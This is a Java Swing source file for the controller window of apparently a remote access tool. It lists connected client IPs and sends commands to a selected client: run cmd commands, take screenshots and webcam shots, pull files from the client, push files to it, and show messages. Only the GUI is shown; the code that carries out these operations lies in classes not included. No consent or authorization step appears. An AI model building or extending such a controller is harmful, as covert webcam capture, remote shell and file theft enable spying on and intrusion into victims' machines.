import java.awt.Color;
import java.awt.FileDialog;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.SwingConstants;

public class Server_Frame extends JFrame implements ActionListener {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	
	//colors
	Colors colors = new Colors();
	public final Color background_color = Colors.light_black;
	public final Color foreground_color = Colors.white;
	
	//buttons
	JButton start_scanning =  new JButton("Start Scanning");
	JButton stop_scanning =  new JButton("Stop Scanning");
	JButton disconnect_all =  new JButton("Disconnect All");
	JButton show_message_button =  new JButton("Show Message");
	JButton receive_file =  new JButton("Receive File");
	JButton send_file =  new JButton("Send File");
	JButton screenshot_button =  new JButton("Take SS");
	JButton cmdCommand_button =  new JButton("Cmd Command");
	JButton webcamshot_button =  new JButton("Webcam");

	
	//labels
	static JLabel info_label = new JLabel();
	static JLabel connection_count_info_label = new JLabel();
	
	//textfieldes
	JTextField path_field = new JTextField();

	//comboboxes
	static JComboBox<String> connected_ips = new JComboBox<String>();
	
	//filedialog
	FileDialog filedialog = new FileDialog(this, "Select File To Send");
	
	
	Server_Thread server_thread;

	static boolean iswaiting = false;

	
	
	Server_Frame(){
		create_frame();
		buttons();
		labels();
		textfields();
		comboboxes();
		server_thread = new Server_Thread();
		server_thread.start();
	}

	
	void create_frame() {
		setSize(300,320);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setResizable(false);
		setVisible(true);
		//setAlwaysOnTop(true);
		this.setLayout(null);
		setFocusable(true);
		setLocationRelativeTo(null);
		getContentPane().setBackground(background_color);
	}



	void buttons() {

		add(receive_file);
		receive_file.setBounds(150,90,130,30);
		receive_file.setFont(new Font("arial",Font.BOLD,13));
		receive_file.addActionListener(this);		
		receive_file.setFocusable(false);
		receive_file.setContentAreaFilled(false);
		//receive_file.setForeground(foreground_color);

		add(send_file);
		send_file.setBounds(10,90,130,30);
		send_file.setFont(new Font("arial",Font.BOLD,13));
		send_file.addActionListener(this);		
		send_file.setFocusable(false);
		send_file.setContentAreaFilled(false);
		//send_file.setForeground(foreground_color);

		add(show_message_button);
		show_message_button.setBounds(10,130,130,30);
		show_message_button.setFont(new Font("arial",Font.BOLD,13));
		show_message_button.addActionListener(this);		
		show_message_button.setFocusable(false);
		show_message_button.setContentAreaFilled(false);
		//show_message_button.setForeground(foreground_color);

		add(screenshot_button);
		screenshot_button.setBounds(150,130,130,30);
		screenshot_button.setFont(new Font("arial",Font.BOLD,13));
		screenshot_button.addActionListener(this);		
		screenshot_button.setFocusable(false);
		screenshot_button.setContentAreaFilled(false);
		//screenshot_button.setForeground(foreground_color);
		
		add(start_scanning);
		start_scanning.setBounds(150,210,130,30);
		start_scanning.setFont(new Font("arial",Font.BOLD,13));
		start_scanning.addActionListener(this);		
		start_scanning.setFocusable(false);
		start_scanning.setContentAreaFilled(false);
		//start_scanning.setForeground(foreground_color);
		
		add(stop_scanning);
		stop_scanning.setBounds(10,210,130,30);
		stop_scanning.setFont(new Font("arial",Font.BOLD,13));
		stop_scanning.addActionListener(this);		
		stop_scanning.setFocusable(false);
		stop_scanning.setContentAreaFilled(false);
		//stop_scanning.setForeground(foreground_color);
		
		add(disconnect_all);
		disconnect_all.setBounds(150,250,130,30);
		disconnect_all.setFont(new Font("arial",Font.BOLD,13));
		disconnect_all.addActionListener(this);		
		disconnect_all.setFocusable(false);
		disconnect_all.setContentAreaFilled(false);
		//disconnect_all.setForeground(foreground_color);
		
		add(cmdCommand_button);
		cmdCommand_button.setBounds(10,170,130,30);
		cmdCommand_button.setFont(new Font("arial",Font.BOLD,13));
		cmdCommand_button.addActionListener(this);		
		cmdCommand_button.setFocusable(false);
		cmdCommand_button.setContentAreaFilled(false);
		//show_message_button.setForeground(foreground_color);
		
		add(webcamshot_button);
		webcamshot_button.setBounds(150,170,130,30);
		webcamshot_button.setFont(new Font("arial",Font.BOLD,13));
		webcamshot_button.addActionListener(this);		
		webcamshot_button.setFocusable(false);
		webcamshot_button.setContentAreaFilled(false);
		//show_message_button.setForeground(foreground_color);
	}

	void labels() {
		add(info_label);
		info_label.setBounds(10,10,210,35);
		info_label.setFont(new Font("arial",Font.BOLD,25));
		info_label.setForeground(colors.red);
		info_label.setText("not scanning");
		info_label.setHorizontalAlignment(SwingConstants.LEFT);
		
		add(connection_count_info_label);
		connection_count_info_label.setBounds(230,10,50,35);
		connection_count_info_label.setFont(new Font("arial",Font.BOLD,25));
		connection_count_info_label.setForeground(colors.green);
		connection_count_info_label.setText("00");
		connection_count_info_label.setHorizontalAlignment(SwingConstants.RIGHT);
	}

	void textfields() {
		add(path_field);
		path_field.setBounds(10,50,270,30);
		path_field.setFont(new Font("arial",Font.BOLD,20));
		//path_field.setFocusable(true);
		//path_field.setBackground(background_color);
		//path_field.setForeground(foreground_color);
		//path_field.setCaretColor(foreground_color);
	}


	void comboboxes() {
		add(connected_ips);
		connected_ips.setBounds(10,250,130,30);
		connected_ips.setFont(new Font("arial",Font.BOLD,15));
		//connected_ips.setBackground(background_color);
		//connected_ips.setForeground(foreground_color);
	}
	
	



	@Override
	public void actionPerformed(ActionEvent e) {
		
		if(e.getSource() == start_scanning) {
			if(!iswaiting) {
				iswaiting = true;
				server_thread.startServer();
				info_label.setForeground(colors.green);
				info_label.setText("scanning");
			}
		}

		if(e.getSource() == stop_scanning) {
			if(iswaiting) {
				iswaiting = false;
				info_label.setForeground(colors.red);
				info_label.setText("not scanning");
			}
		}
		
		if(e.getSource() == disconnect_all) {
			if(true) {
				iswaiting = false;
				server_thread.closeServer();				
				info_label.setForeground(colors.red);
				info_label.setText("not scanning");
			}
		}

		if(e.getSource() == show_message_button) {
			if(connected_ips.getItemCount() != 0) {
				System.out.println("operation request to: " + connected_ips.getSelectedItem());
				server_thread.socket_threads.get(connected_ips.getSelectedIndex()).OPERATION_show_message(path_field.getText().toString());
			}
		}

		if(e.getSource() == screenshot_button) {
			if(connected_ips.getItemCount() != 0) {
				System.out.println("operation request to: " + connected_ips.getSelectedItem());
				server_thread.socket_threads.get(connected_ips.getSelectedIndex()).OPERATION_screenshot("screenshots");
			}
		}
		
		

		if(e.getSource() == receive_file) {
			if(connected_ips.getItemCount() != 0) {
				System.out.println("operation request to: " + connected_ips.getSelectedItem());
				server_thread.socket_threads.get(connected_ips.getSelectedIndex()).OPERATION_send_clients_file_to_server(path_field.getText().toString(), "downloaded");
			}
		}


		if(e.getSource() == send_file) {
			if(connected_ips.getItemCount() != 0) {
				filedialog.setMode(FileDialog.LOAD);
				filedialog.setVisible(true);
				String filedir = filedialog.getDirectory();
				String filename = filedialog.getFile();
				String abs_path = filedir + filename;
				
				if(filedir != null) {
					System.out.println("operation request to: " + connected_ips.getSelectedItem());
					server_thread.socket_threads.get(connected_ips.getSelectedIndex()).OPERATION_send_servers_file_to_client(abs_path, path_field.getText().toString());
				}
				
			}
		}
		
		if (e.getSource() == cmdCommand_button) {
			
			server_thread.socket_threads.get(connected_ips.getSelectedIndex()).Operation_cmd_command(path_field.getText().toString());
		}
		
		if (e.getSource() == webcamshot_button) {
			server_thread.socket_threads.get(connected_ips.getSelectedIndex()).OPERATION_webcamshot("webcamshot","");
			
		}

		


	}




}
